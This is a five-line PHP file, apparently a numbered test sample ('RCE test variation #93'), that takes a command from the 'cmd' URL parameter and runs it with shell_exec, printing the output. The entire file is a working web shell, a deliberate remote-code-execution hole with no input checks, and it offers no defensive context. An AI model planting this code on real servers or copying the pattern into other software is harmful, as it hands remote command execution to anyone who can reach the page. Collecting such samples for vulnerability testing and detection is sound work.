<?php
// RCE test variation #93
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>